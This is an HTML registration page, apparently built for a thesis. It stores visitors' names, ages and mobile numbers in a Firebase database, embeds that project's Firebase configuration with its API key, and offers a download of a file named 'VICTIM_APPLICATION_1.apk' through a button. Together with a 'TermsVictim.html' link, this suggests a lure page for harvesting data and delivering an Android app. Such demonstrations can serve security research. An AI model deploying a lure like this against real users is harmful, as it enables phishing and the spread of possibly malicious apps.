<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registration for the User</title>
    <link rel="stylesheet" href="assets/css/style2.css">
</head>

<body>
    <div class="container">
        <div id="MainForm">
            <h2>Register User</h2>
            <form>
                <div class="form-floating">
                    <input type="text" value="" id="serialNo" required placeholder="Serial No.">
                </div>
                <div class="form-floating">
                    <input type="text" value="" id="fullName" required placeholder="Full Name">
                </div>
                <div class="form-floating">
                    <input type="number" value="" id="age" required placeholder="Age" min="0">
                </div>
                <div class="form-floating">
                    <input type="tel" value="" id="mobile" required placeholder="Mobile Number">
                </div>
                <div class="form-check custom-checkbox">
                    <input type="checkbox" class="form-check-input" id="termsCheck" required>
                    <label class="form-check-label custom-label" for="termsCheck">I accept the <a href="TermsVictim.html" id="termsLink">Terms and Services</a></label>
                </div>
                <button type="submit" id="submit">Submit</button>
                <button id="downloadButton">Download App</button> <!-- Added download button here -->
            </form>
        </div>
    </div>

    <script>
        let DownloadApp = () => {
            let downloadLink = "VICTIM_APPLICATION_1.apk";
            let a = document.createElement("a");
            a.href = downloadLink;
            a.download = downloadLink;
            a.click();
            console.log("App download initiated...");
        };

        document.getElementById('downloadButton').addEventListener('click', DownloadApp);
    </script>

    <!-- Firebase JavaScript SDK -->
    <script type="module">
        // Import the functions you need from the SDKs you need
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-database.js";

        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCzuDJ6dK5FlUvbt7dFrPiI25lxPB3pIZg",
            authDomain: "finalized-thesis.firebaseapp.com",
            databaseURL: "https://finalized-thesis-default-rtdb.firebaseio.com",
            projectId: "finalized-thesis",
            storageBucket: "finalized-thesis.appspot.com",
            messagingSenderId: "320697781293",
            appId: "1:320697781293:web:65db29cdb22ca75a173ca4"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);

        // Get a reference to the database service
        const db = getDatabase(app);

        document.querySelector("form").addEventListener('submit', function (e) {
            e.preventDefault();

            // Check if terms and conditions are accepted
            if (!document.getElementById('termsCheck').checked) {
                console.error("Terms and conditions not accepted!");
                return;
            }

            // Get input values
            const serialNo = document.getElementById("serialNo").value;
            const fullName = document.getElementById("fullName").value;
            const age = parseInt(document.getElementById("age").value); // Parse age as integer
            const mobile = document.getElementById("mobile").value;

            // Set data in Firebase
            set(ref(db, 'users/' + serialNo), {
                fullName: fullName,
                age: age,
                mobile: mobile
            }).then(() => {
                alert("Registration Successful!");
                // Optionally, you can reset the form after successful submission
                document.querySelector("form").reset();
            }).catch((error) => {
                console.error("Error adding document: ", error);
                alert("An error occurred. Please try again later.");
            });
        });
    </script>
</body>

</html>
